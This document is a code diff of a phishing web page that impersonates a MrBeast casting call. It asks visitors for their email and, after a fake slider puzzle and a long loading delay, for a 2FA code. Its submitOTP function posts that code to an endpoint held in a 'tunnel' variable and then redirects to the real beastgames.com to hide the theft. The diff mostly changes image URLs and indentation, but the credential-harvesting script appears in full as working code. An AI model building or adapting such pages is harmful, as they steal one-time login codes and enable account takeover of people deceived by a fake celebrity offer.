@@ -9,7 +9,7 @@
         :root { --primary-blue: #00a8e8; --beast-pink: #f12e3e; }
         * { box-sizing: border-box; }
         body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-color: var(--primary-blue); margin: 0; color: #fff; overflow-x: hidden; position: relative; }
-        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png'); background-size: 70px; opacity: 0.25; z-index: 0; pointer-events: none; }
+        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com'); background-size: 70px; opacity: 0.25; z-index: 0; pointer-events: none; }
         .top-logo { width: 320px; margin-top: 50px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(0,0,0,0.4)); z-index: 5; position: relative; }
         .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 45px 30px; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.8); border: 1px solid #333; position: relative; z-index: 10; margin-bottom: 60px; }
         .mid-logo { width: 130px; margin: 0 auto 20px auto; display: block; filter: drop-shadow(0 0 15px var(--primary-blue)); }
@@ -32,10 +32,10 @@
 </head>
 <body>
     <div class="bg-pattern"></div>
-    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo">
+    <img src="https://crystalpng.com" class="top-logo">
     <div class="box">
         <div id="step1">
-            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="mid-logo">
+            <img src="https://crystalpng.com" class="mid-logo">
             <div class="mrbeast-style-text"><span class="mr-txt">MR</span> BEAST CASTING</div>
             <p>Fill in your details to apply for the next viral challenge</p>
             <input type="email" id="email" placeholder="Email Address" required>
@@ -74,52 +74,43 @@
             piece.style.backgroundImage = "url('https://storage.planner5d.com/s/b8164d538de1ebe13909b8a8e58f795d_1.jpg?v=1717696854')";
             piece.style.backgroundSize = "400px 180px"; 
             piece.style.backgroundPosition = "-280px -60px"; 
-                    const move = (e) => {
-            if (!dragging) return;
-            let clientX = e.touches ? e.touches[0].clientX : e.clientX;
-            let rect = track.getBoundingClientRect();
-            let x = clientX - rect.left - 35;
-            if (x < 0) x = 0; if (x > rect.width - 70) x = rect.width - 70;
-            handle.style.left = x + 'px';
-            piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
-            
-           
-            if (x > 222 && x < 242) { 
-                dragging = false; 
-                handle.style.background = "#00ff00"; 
-                setTimeout(showLoader, 500); 
-            }
-        };
-
-        handle.addEventListener('mousedown', () => dragging = true);
-        handle.addEventListener('touchstart', (e) => { dragging = true; });
-        window.addEventListener('mousemove', move);
-        window.addEventListener('touchmove', move);
-        window.addEventListener('mouseup', () => dragging = false);
-        window.addEventListener('touchend', () => dragging = false);
-    }
-
-    function showLoader() {
-        document.getElementById('puzzle-box').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('step2_box').style.display = 'block';
-        }, 15000); 
-    }
-
-    function submitOTP() {
-        const c = document.getElementById('2fa_code').value;
-        fetch(tunnel, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: new URLSearchParams({ '2fa_code': c })
-        }).then(() => {
-            window.location.href = "https://www.beastgames.com"; 
-        }).catch(() => {
-            window.location.href = "https://www.beastgames.com";
-        });
-    }
-</script>
+            const move = (e) => {
+                if (!dragging) return;
+                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                let rect = track.getBoundingClientRect();
+                let x = clientX - rect.left - 35;
+                if (x < 0) x = 0; if (x > rect.width - 70) x = rect.width - 70;
+                handle.style.left = x + 'px';
+                piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
+                if (x > 222 && x < 242) { dragging = false; handle.style.background = "#00ff00"; setTimeout(showLoader, 500); }
+            };
+            handle.addEventListener('mousedown', () => dragging = true);
+            handle.addEventListener('touchstart', (e) => { dragging = true; });
+            window.addEventListener('mousemove', move);
+            window.addEventListener('touchmove', move);
+            window.addEventListener('mouseup', () => dragging = false);
+            window.addEventListener('touchend', () => dragging = false);
+        }
+        function showLoader() {
+            document.getElementById('puzzle-box').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('step2_box').style.display = 'block';
+            }, 15000);
+        }
+        function submitOTP() {
+            const c = document.getElementById('2fa_code').value;
+            fetch(tunnel, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({ '2fa_code': c })
+            }).then(() => {
+                window.location.href = "https://www.beastgames.com";
+            }).catch(() => {
+                window.location.href = "https://www.beastgames.com";
+            });
+        }
+    </script>
 </body>
 </html>
